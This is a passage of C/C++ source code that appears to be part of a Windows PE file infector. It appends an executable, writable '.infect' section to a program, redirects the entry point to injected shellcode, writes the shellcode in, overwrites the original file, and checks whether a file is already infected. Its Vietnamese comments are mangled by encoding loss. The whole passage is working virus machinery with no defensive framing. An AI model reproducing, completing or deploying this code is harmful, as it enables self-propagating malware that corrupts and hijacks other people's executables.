	NTHeaders.OptionalHeader.AddressOfEntryPoint = NewEntryPoint;

	sh->Characteristics |=
		IMAGE_SCN_MEM_EXECUTE
		| IMAGE_SCN_MEM_READ
		| IMAGE_SCN_MEM_WRITE
		| IMAGE_SCN_CNT_CODE;
	adjustPEHeaders(&NTHeaders, SectionHeaders, 0);

	fwrite(&DOSHeader, sizeof(IMAGE_DOS_HEADER), 1, FouHanle);
	padding(FouHanle, DOSHeader.e_lfanew);
	fwrite(&NTHeaders, sizeof(IMAGE_NT_HEADERS32), 1, FouHanle);
	fwrite(SectionHeaders, sizeof(IMAGE_SECTION_HEADER), NTHeaders.FileHeader.NumberOfSections, FouHanle);

	while (1) {
		int ReadBytes = copyToFile(FouHanle, FinHanle, COPY_CURRENT_CURSOR, 0xffffffff, 0xffff);
		if (ReadBytes == 0)
			break;
	}

	return OldEntryPoint;
}


#include <stdio.h>
#include <windows.h>

DWORD addNewSection(
	FILE* FStream,
	FILE* NewFStream,
	UCHAR* SectionName,
	DWORD SectionSize,
	BOOL Verbosity
) {
	const int MAX_BUFFER_SIZE = 0xff;

	// ??t con tr? file
	FILE* FinHandle = FStream;
	FILE* FouHandle = NewFStream;

	// ??c các ph?n PE header t? file g?c
	IMAGE_DOS_HEADER DOSHeader;
	IMAGE_NT_HEADERS32 NTHeaders;
	IMAGE_SECTION_HEADER SectionHeaders[MAX_SECTIONS];
	memset(SectionHeaders, 0, sizeof(SectionHeaders));
	peHeaderReader(FinHandle, &DOSHeader, &NTHeaders, SectionHeaders);

	// ??t thông tin cho ph?n m?i thêm vào
	int nSections = NTHeaders.FileHeader.NumberOfSections;
	strncpy_s((char*)SectionHeaders[nSections].Name, 8, (char*)SectionName, 8);
	SectionHeaders[nSections].VirtualAddress = align(SectionHeaders[nSections - 1].VirtualAddress + SectionHeaders[nSections - 1].Misc.VirtualSize, NTHeaders.OptionalHeader.SectionAlignment);
	SectionHeaders[nSections].Misc.VirtualSize = align(SectionSize, NTHeaders.OptionalHeader.SectionAlignment);
	SectionHeaders[nSections].PointerToRawData = align(SectionHeaders[nSections - 1].PointerToRawData + SectionHeaders[nSections - 1].SizeOfRawData, NTHeaders.OptionalHeader.FileAlignment);
	SectionHeaders[nSections].SizeOfRawData = align(SectionSize, NTHeaders.OptionalHeader.FileAlignment);
	SectionHeaders[nSections].Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_CNT_CODE | IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_CNT_UNINITIALIZED_DATA;

	// ?i?u ch?nh các ph?n PE header
	adjustPEHeaders(&NTHeaders, SectionHeaders, FALSE);

	// Ghi PE header vào file m?i
	fwrite(&DOSHeader, sizeof(IMAGE_DOS_HEADER), 1, FouHandle);
	padding(FouHandle, DOSHeader.e_lfanew);
	fwrite(&NTHeaders, sizeof(IMAGE_NT_HEADERS32), 1, FouHandle);
	fwrite(SectionHeaders, sizeof(IMAGE_SECTION_HEADER), NTHeaders.FileHeader.NumberOfSections, FouHandle);

	// Copy các d? li?u t? file g?c sang file m?i
	DWORD FinCurrentCursor = DOSHeader.e_lfanew + sizeof(IMAGE_NT_HEADERS32) + sizeof(IMAGE_SECTION_HEADER) * NTHeaders.FileHeader.NumberOfSections;
	DWORD RemainSize = NTHeaders.OptionalHeader.SizeOfHeaders - FinCurrentCursor;
	copyToFile(FouHandle, FinHandle, FinCurrentCursor, RemainSize, MAX_BUFFER_SIZE);

	// Copy các section khác t? file g?c sang file m?i
	for (int i = 0; i < NTHeaders.FileHeader.NumberOfSections - 1; i++) {
		int Offset = SectionHeaders[i].PointerToRawData;
		padding(FouHandle, Offset);
		copyToFile(FouHandle, FinHandle, Offset, SectionHeaders[i].SizeOfRawData, MAX_BUFFER_SIZE);
	}

	// Copy section m?i thêm vào file m?i
	int OffsetAtFinalOfSection = align(SectionHeaders[NTHeaders.FileHeader.NumberOfSections - 1].PointerToRawData + SectionHeaders[NTHeaders.FileHeader.NumberOfSections - 1].SizeOfRawData, NTHeaders.OptionalHeader.FileAlignment);
	padding(FouHandle, OffsetAtFinalOfSection);

	// Copy ph?n còn l?i c?a file g?c sang file m?i
	while (1) {
		long ReadBytes = copyToFile(FouHandle, FinHandle, COPY_CURRENT_CURSOR, 0xffffffff, MAX_BUFFER_SIZE);
		if (ReadBytes == 0)
			break;
	}

	return SectionHeaders[NTHeaders.FileHeader.NumberOfSections - 1].PointerToRawData;
}



long long int file_length(const char* filename) {
	HANDLE hFile = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		fprintf(stderr, "Error opening file %s\n", filename);
		return -1; // Return -1 to indicate an error
	}

	LARGE_INTEGER fileSize;
	if (!GetFileSizeEx(hFile, &fileSize)) {
		fprintf(stderr, "Error getting file size\n");
		CloseHandle(hFile);
		return -1; // Return -1 to indicate an error
	}

	CloseHandle(hFile);
	return fileSize.QuadPart;
}

void overwrite_file(const char* currentInputFileName, const char* tmpOutFileName) {
	if (!MoveFileExA(tmpOutFileName, currentInputFileName, MOVEFILE_REPLACE_EXISTING)) {
		fprintf(stderr, "Error overwriting file %s. Error code: 0x%lx\n", currentInputFileName, GetLastError());
	}
	else {
		printf("File %s overwritten successfully.\n", currentInputFileName);
	}

	printf("File %s overwritten with %s\n", currentInputFileName, tmpOutFileName);


}


int DWORD2AddressAsShellcode(DWORD d, UCHAR* Shellcode) {
	Shellcode[0] = *((UCHAR*)&d + 0);
	Shellcode[1] = *((UCHAR*)&d + 1);
	Shellcode[2] = *((UCHAR*)&d + 2);
	Shellcode[3] = *((UCHAR*)&d + 3);
	return 0;
}

int infectShellcode(FILE* FStream, FILE* NewFStream, UCHAR* ShellCode, DWORD Size, DWORD Offset) {
	FILE* FinHanle = FStream;
	FILE* FouHanle = NewFStream;

	copyToFile(FouHanle, FinHanle, 0, Offset, 0xff);
	fwrite(ShellCode, 1, Size, FouHanle);
	fseek(FinHanle, Size, SEEK_CUR);
	while (1) {
		long ReadBytes = copyToFile(FouHanle, FinHanle, COPY_CURRENT_CURSOR, 0xffffffff, 0xff);
		if (ReadBytes == 0)
			break;
	}

	return 0;
}

bool isInfectedFile(const char* filename) {
	//check if file is infected
	IMAGE_DOS_HEADER DOSHeader;
	IMAGE_NT_HEADERS32 NTHeaders;
	IMAGE_SECTION_HEADER SectionHeaders[MAX_SECTIONS];

	FILE* FinHandle;
	errno_t err = fopen_s(&FinHandle, filename, "rb");

	if (err != 0) {

		std::cerr << "Error opening the file. Error code: " << err << std::endl;
		exit(EXIT_FAILURE);
	};

	peHeaderReader(FinHandle, &DOSHeader, &NTHeaders, SectionHeaders);
	fclose(FinHandle);

	IMAGE_SECTION_HEADER last_section = SectionHeaders[NTHeaders.FileHeader.NumberOfSections - 1];

	if (strcmp((char*)last_section.Name, ".infect") == 0) {
		return true;

	}
	return false;
}



//int main() {
//    FILE* filePtr;
//    const char* filename = "C:\\Users\\nguye\\Desktop\\C++\\Hello\\x64\\Debug\\calc.exe";
//
//    // Open the file for reading in binary mode
//    errno_t err = fopen_s(&filePtr, filename, "rb");
//
//    // Check if the file is opened successfully
//    if (err != 0) {
//        // fopen_s failed, handle the error
//        // The error code can be found in the 'err' variable
//        std::cerr << "Error opening the file. Error code: " << err << std::endl;
//        exit(EXIT_FAILURE); // Exit the program with failure
//    }
//
//    IMAGE_DOS_HEADER DOSHeader;
//    IMAGE_NT_HEADERS32 NTHeaders;
//    IMAGE_SECTION_HEADER SectionHeaders[MAX_SECTIONS];
//    //printAllImportedSymbol(filePtr);
//
//    // Assuming readPE32Header is a function declared and defined elsewhere
//    readPE32Header(filePtr, &DOSHeader, &NTHeaders, SectionHeaders);
//
//    //UCHAR dllNameBuffer[] = "KERNEL32.dll";
//    //UCHAR functionNameBuffer[] = "LoadLibraryA";
//
//    //DWORD d = findFuncAddressByName(filePtr, dllNameBuffer, functionNameBuffer);
//
//    //printf("%d", d);
//    fclose(filePtr);
//
//    // Assuming printDOSHeader and printSectionHeaders are functions declared and defined elsewhere
//    printDOSHeader(DOSHeader);
//    printSectionHeaders(SectionHeaders, NTHeaders.FileHeader.NumberOfSections);
//    
//
//    return 0; // Return success
//}
